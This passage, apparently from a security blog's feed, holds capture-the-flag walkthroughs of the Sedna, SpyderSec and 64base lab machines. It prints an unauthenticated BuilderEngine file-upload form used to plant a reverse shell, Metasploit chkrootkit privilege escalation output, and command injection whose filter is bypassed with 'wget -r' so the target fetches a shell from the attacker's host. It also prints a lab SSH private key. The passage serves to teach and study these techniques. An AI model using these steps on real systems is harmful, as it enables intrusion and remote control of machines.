# Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"

1) Unauthenticated Unrestricted File Upload:

    POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/

    Vulnerable Parameter: files[]

    We can upload test.php and reach the file via the following link:
    /files/test.php
-->


<p><html>
<body>
<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"></p>

<pre><code>&lt;input type="file" name="files[]" /&gt;
&lt;input type="submit" value="send" /&gt;
</code></pre>

<p></form>
</body>
</html>
```</p>

<p>I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:</p>

<p><img class="center" src="/images/pentest/sedna/form.jpg" title="&lsquo;upload&rsquo; &lsquo;upload form&rsquo;" ></p>

<p>Then I went to <a href="http://192.168.145.128/files/shell.php">http://192.168.145.128/files/shell.php</a> and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in <em>/etc/passwd</em>:</p>

<p><code>
crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
</code></p>

<p>Cracking the password for this user might be another flag, but first I need root. Since the exploits I&rsquo;ve tried so far didn&rsquo;t work, I decided to go down the <a href="https://www.exploit-db.com/exploits/40839/">dirtycow</a> route. Unfortunately, that didn&rsquo;t work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail.</p>

<h2>Getting root</h2>

<p>The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed <em>chkrootkit</em> was present. I searched for available exploits and found a privilege escalation one:</p>

<p>```
searchsploit chkrootkit</p>

<hr />

<p> Exploit Title                                                                   |  Path</p>

<pre><code>                                                                             | (/usr/share/exploitdb/)
</code></pre>

<hr />

<p>Chkrootkit &ndash; Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
Chkrootkit 0.49 &ndash; Local Privilege Escalation                                     | exploits/linux/local/33899.txt</p>

<hr />

<p>Shellcodes: No Result
```</p>

<p>The exploit is available for version 0.49, so let&rsquo;s see what version is on the box:</p>

<p><code>
www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
./chkrootkit -V
chkrootkit version 0.49
</code></p>

<p>Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called <em>update</em> with content of your choice in /tmp and wait for chkrootkit to run it as root.</p>

<p>Metasploit came through and finally, I got root:</p>

<p>```
msf exploit(unix/local/chkrootkit) > options</p>

<p>Module options (exploit/unix/local/chkrootkit):</p>

<p>   Name        Current Setting       Required  Description</p>

<hr />

<p>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
   SESSION                           yes       The session to run this module on.</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(unix/local/chkrootkit) > set SESSION 1
SESSION => 1
msf exploit(unix/local/chkrootkit) > run</p>

<p>[!] SESSION may not be compatible with this module.
[<em>] Started reverse TCP double handler on 192.168.145.133:4444
[!] Rooting depends on the crontab (this could take a while)
[</em>] Payload written to /tmp/update
[<em>] Waiting for chkrootkit to run via cron&hellip;
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo EzISATvm3xKkw6bX;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;EzISATvm3xKkw6bX\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 2 opened (192.168.145.133:4444 &ndash;> 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
[+] Deleted /tmp/update
whoami
root
```</p>

<p>Got the root flag:</p>

<p><code>
cat /root/flag.txt
a10828bee17db751de4b936614558305
</code></p>

<p>It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:</p>

<p><code>
&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;
</code></p>

<p>I didn&rsquo;t want to crack the password for the 4th flag, so I decided to call it a day at &frac34; flags.</p>

<p>```</p>

<hr />

<p>/ I must have a prodigious quantity of  \
| mind; it takes me as much as a week   |
| sometimes to make it up.              |
|                                       |
\ &mdash; Mark Twain, &ldquo;The Innocents Abroad&rdquo; /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Take the SpyderSec Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge/"/>
    <updated>2018-11-10T14:43:09+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge</id>
    <content type="html"><![CDATA[<p>The challenge:</p>

<blockquote><p>You are looking for two flags. Using discovered pointers in various elements of the running web
application you can deduce the first flag (a downloadable file) which is required to find the second
flag (a text file). Look, read and maybe even listen. You will need to use basic web application
recon skills as well as some forensics to find both flags.</p></blockquote>

<!-- more -->


<p><code>
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
|_http-server-header: Apache
|_http-title: SpyderSec | Challenge
</code></p>

<p>There is just one page for the web server:</p>

<p><img class="center" src="/images/pentest/spydersec/spydersec.png" title="&lsquo;spydersec&rsquo; &lsquo;spydersec&rsquo;" ></p>

<p>There is some peculiar Javascript in the source:</p>

<p>```</p>

<script>
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e',16,16,'6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69'.split('|'),0,{}))
</script>


<p>```</p>

<p>I used an <a href="https://beautifier.io/">online JS beautifier</a> to deobfuscate this to a hex string, which I then decoded to <code>alert(&lsquo;mulder.fbi&rsquo;);</code>. This name is familiar to me from the X-Files. Anyway, not sure about its relevance for now. Moving on with the information gathering, since nothing came out of Nikto or Gobuster, I browsed the page in Burp, and noticed a strange cookie being set:</p>

<p><code>
Cookie: URI=%2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F
</code></p>

<p>URL decoding this gave me the value <code>/v/81JHPbvyEQ8729161jd6aKQ0N4/</code> Tried browsing to this and got a 403 Forbidden error. There is some piece of the puzzle missing..so I took the next step and downloaded all the images and ran them through exiftool..and finally got some luck with the Challenge.png image, which had a hex comment:</p>

<p><code>
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
</code></p>

<p>Had to hex-decode this 2 times to get a base64 string: <em>QSFWdX5qdEgjNzI5c0xBO2g0JQ==</em>, which I decoded to <code>A!Vu~jtH#729sLA;h4%</code>. This looks like a password, but where to use it?</p>

<p>With the hints from the description, knowing that a file will need to be downloaded, I treated mulder.fbi as a file and tried appending it to the URL path that gave me a forbidden error: <a href="http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi">http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi</a></p>

<p>That actually worked and I downloaded the file, which is apparently an MP4:</p>

<p><code>
file mulder.fbi
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
</code></p>

<p>This is a song by The Platters. Since I couldn&rsquo;t use steghide on a video, I googled for MP4 steganography and found this Lifehacker article about <a href="https://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">embedding a TrueCrypt volume in a video</a>. I installed Veracrypt and used it to mount the file as a volume, in TrueCrypt mode. At the password prompt, I used the string that I&rsquo;ve decoded earlier, and it served me the volume, with a file called Flag.txt inside!</p>

<p>```
cat Flag.txt
Congratulations!</p>

<p>You are a winner.</p>

<p>Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better?</p>

<p><a href="https://www.spydersec.com/feedback">https://www.spydersec.com/feedback</a>
```</p>

<p>The main takeaways from this challenge for me were the steganography possibilities for video files. Until next time!</p>

<p>```</p>

<hr />

<p>/ Q: How many hardware engineers does it \
| take to change a light bulb? A: None.  |
| We&rsquo;ll fix it in software.              |
|                                        |
| Q: How many system programmers does it |
| take to change a light bulb? A: None.  |
| The application can work around it.    |
|                                        |
| Q: How many software engineers does it |
| take to change a light bulb? A: None.  |
| We&rsquo;ll document it in the manual.       |
|                                        |
| Q: How many tech writers does it take  |
| to change a light bulb? A: None. The   |
\ user can figure it out.                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us/"/>
    <updated>2018-10-26T22:14:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us</id>
    <content type="html"><![CDATA[<p>This machine is based on Star Wars. The goal is &ldquo;to Beat the Empire and steal the plans for the Death Star before its too late.&rdquo;. For this to happen, 6 flags encoded in base64 need to be collected.</p>

<p><a href="https://www.youtube.com/watch?v=v8MqvUeDqL4">I AM THE EMPIRE!</a></p>

<!-- more -->


<p><code>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh?
| fingerprint-strings:
|   GenericLines, NULL:
|     The programs included with the Fedora GNU/Linux system are free software;
|     exact distribution terms for each program are described in the
|     individual files in /usr/share/doc/*/copyright.
|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
|     permitted by applicable law.
|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 429 disallowed entries (15 shown)
| /administrator/ /admin/ /login/ /88888/ /88888888/
| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
|_/across/ /activation/ /Adjustments/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: 64base
4899/tcp  open  radmin?
| fingerprint-strings:
|   NULL:
|     sshhh! ssh! droids!
|     So..
|     found a way in then...
|     but, can you pop root?
|     /~\n |oo ) Did you hear that?
|     _=/_
|     ()\x20 //|/.\|\
|     _|_____|_ \ _/ ||
|     \|\x20/| ||
|     ||__*__|| | | |
|     ___/ ~| []|[]
|     /=\x20/=\x20/=\x20 | | |
|_    ________________[_]_[_]_[_]________/_]_[__________________________
62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)
</code></p>

<p>The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:</p>

<p>```
nc -vn 192.168.145.138 22
(UNKNOWN) [192.168.145.138] 22 (ssh) open
The programs included with the Fedora GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001</p>

<p>#
id
```</p>

<p>Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:</p>

<p>```
You found a way in then&hellip;</p>

<p>but, can you pop root?</p>

<pre><code>                                       /~\
                                      |oo )    Did you hear that?
                                      _\=/_
                      ___            /  _  \
                     / ()\          //|/.\|\\
                   _|_____|_        \\ \_/  ||
                  | | === | |        \|\ /| ||
                  |_|  O  |_|        # _ _/ #
                   ||  O  ||          | | |
                   ||__*__||          | | |
                  |~ \___/ ~|         []|[]
                  /=\ /=\ /=\         | | |
  ________________[_]_[_]_[_]________/_]_[_\_________________________
</code></pre>

<p>```</p>

<h2>Flag #1 &ndash; Decode and decode some more</h2>

<p>The web server takes us to Lord Vader&rsquo;s blog:</p>

<p><img class="center" src="/images/pentest/64base/blog.png" title="&lsquo;blog&rsquo; &lsquo;vader blog&rsquo;" ></p>

<p>You probably noticed that weird string, <em>dmlldyBzb3VyY2UgO0QK</em>. If you look in the HTML source, you will find a comment following it:</p>

<p>```</p>

<!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->


<p>```</p>

<p>It&rsquo;s hex encoded, and decoding it gives a&hellip;I&rsquo;m sure you expect it by now&hellip;base64 string:</p>

<p><code>
ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
</code></p>

<p>Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code></p>

<h2>Flag #2 &ndash; Imperial class bounty hunter</h2>

<p>If you browse the pages you can read some Star Wars centric posts. I didn&rsquo;t go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:</p>

<p><img class="center" src="/images/pentest/64base/hint.jpg" title="&lsquo;hint&rsquo; &lsquo;shell hint&rsquo;" ></p>

<p>So..when we&rsquo;ll reach the point of getting a shell, we&rsquo;ll have to use <em>system</em> instead of <em>exec</em>. Cool..now it&rsquo;s time to look inside that massive robots.txt. There are too many entries to show and the few I&rsquo;ve tried were blank. Under <em>/admin</em> there&rsquo;s basic authentication, but the credentials from the first flag didn&rsquo;t work. Some attention to detail is required for this one. In the above picture, there is another important hint that I&rsquo;ve overlooked: <em>Only respond if you are a real Imperial-Class BountyHunter</em>. Within the plethora of robots.txt entries there is this:</p>

<p><code>
Disallow: /Imperial-class/
</code></p>

<p>Useless like the others, but the message said <em>Imperial-Class</em>..could it be that one capital letter would make the difference? I tried <a href="http://192.168.145.138/Imperial-Class/">http://192.168.145.138/Imperial-Class/</a> and another basic authentication box popped up, and this time the credentials worked!</p>

<p><img class="center" src="/images/pentest/64base/error.jpg" title="&lsquo;error&rsquo; &lsquo;error&rsquo;" ></p>

<p>It looks like a dead end, but the source is with us:</p>

<p>```</p>

<!-- don't forget the BountyHunter login -->


<p>```</p>

<p>Adding this part to the URL (<em>Imperial-Class/BountyHunter</em>) takes us to a login page:</p>

<p><img class="center" src="/images/pentest/64base/login.jpg" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:</p>

<p><code>
5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
</code></p>

<p>Decoding them as a block gives us another base64 string:</p>

<p><code>
ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
</code></p>

<p>And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it&rsquo;s the inside that matters, and it&rsquo;s actually a <a href="https://www.youtube.com/watch?v=vJwytFWA8uA">link to Youtube</a></p>

<p><img class="center" src="/images/pentest/64base/burp.png" title="&lsquo;burp&rsquo; &lsquo;burp&rsquo;" ></p>

<p>So we&rsquo;ll have to use Burp for the next part.</p>

<h2>Flag #3 &ndash; Burp'ing for the empire</h2>

<p>I&rsquo;ve put some dummy values in the login form and intercepted the requests with Burp..it&rsquo;s important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>

<h2>Flag #4 &ndash; System, not exec</h2>

<p>Going to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id">http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a> takes us to a page that only has the text &ldquo;[64base Command Shell]&rdquo; displayed on it. Trying different commands for the <em>c</em> parameter doesn&rsquo;t change anything, but we have the tip from before. So I switched to <strong>?f=system&amp;c=id</strong> and got the flag and the command output:</p>

<p>```
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</p>

<p>Debian GNU/Linux 8 \n \l</p>

<p>Sat Oct 27 16:05:00 BST 2018
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux</p>

<pre><code>      inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link
</code></pre>

<p>uid=1001(64base) gid=1001(64base) groups=1001(64base)
```</p>

<p>Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.</p>

<h2>Flag #5 &ndash; When nothing else works, recurse!</h2>

<p>Even though it looks like we have a shell, in reality, many commands don&rsquo;t work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP&rsquo;s <strong>var_dump</strong> function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, but of course it didn&rsquo;t work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, I saw what was filtered out:</p>

<p><code>
string(190) "echo '
flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
 sudo -u 64base wget http192.168.145.1338001shell.php"
</code></p>

<p>The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn&rsquo;t use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the <em>-r</em> switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python&rsquo;s SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:</p>

<p>```
wget -r 192.168.145.133
&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/">http://192.168.145.133/</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 216 [text/html]
Saving to: ‘192.168.145.133/index.html’</p>

<p>192.168.145.133/index.html            100%[======================================================================>]     216  &mdash;.-KB/s    in 0s</p>

<p>2018-10-27 10:03:58 (11.8 MB/s) &ndash; ‘192.168.145.133/index.html’ saved [216/216]</p>

<p>Loading robots.txt; please ignore errors.
&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/robots.txt">http://192.168.145.133/robots.txt</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 404 File not found
2018-10-27 10:03:58 ERROR 404: File not found.</p>

<p>&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/shell.php">http://192.168.145.133/shell.php</a>
Connecting to 192.168.145.133:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 5497 (5.4K) [application/octet-stream]
Saving to: ‘192.168.145.133/shell.php’</p>

<p>192.168.145.133/shell.php             100%[======================================================================>]   5.37K  &mdash;.-KB/s    in 0s</p>

<p>2018-10-27 10:03:58 (638 MB/s) &ndash; ‘192.168.145.133/shell.php’ saved [5497/5497]</p>

<p>FINISHED &mdash;2018-10-27 10:03:58&mdash;
Total wall clock time: 0.01s
Downloaded: 2 files, 5.6K in 0s (212 MB/s)
```</p>

<p>I made the change and dumped the variable as it looks now:</p>

<p><code>
sudo -u 64base wget -r 192.168.145.138
</code></p>

<p>Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&amp;c=ls | wget -r 192.168.145.133</code></p>

<p>Now my server received a request, and when I listed the current directory:</p>

<p><code>
total 48K
drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss
</code></p>

<p>Navigating to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php">http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php</a> served me the shell on my listener:</p>

<p><code>
nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'      
www-data@64base:/$
</code></p>

<p>I looked around and saw more ASCII art files, then I ran a quick search for the flag:</p>

<p><code>
www-data@64base:/$ find / -name flag* 2&gt;/dev/null
/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}
</code></p>

<p>And the hint for the last flag is <code>Look Inside! :D</code>.</p>

<h2>Flag #6 &ndash; Use the force</h2>

<p>Running file on the found file shows that it&rsquo;s a JPEG image:</p>

<p><code>
JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3
</code></p>

<p>There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:</p>

<p><code>
-----BEGIN RSA PRIVATE
</code></p>

<p>I needed to take a better look at this, so I downloaded it to my machine:</p>

<p><img class="center" src="/images/pentest/64base/flag.jpg" title="&lsquo;flag&rsquo; &lsquo;flag5&rsquo;" ></p>

<p>And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:</p>

<p>```
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C</p>

<p>mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>

<p>```
ssh <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#x34;&#53;&#x2e;&#49;&#51;&#x38;">&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#49;&#x34;&#53;&#x2e;&#49;&#x33;&#56;</a> -p 62964 -i ssh.key
Enter passphrase for key &lsquo;ssh.key&rsquo;:</p>

<p>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18</p>

<p>flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
root@64base:~#
```</p>

<p>Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:</p>

<p>```</p>

<pre><code>     __          __  _ _   _____                      
     \ \        / / | | | |  __ \                     
      \ \  /\  / /__| | | | |  | | ___  _ __   ___    
       \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
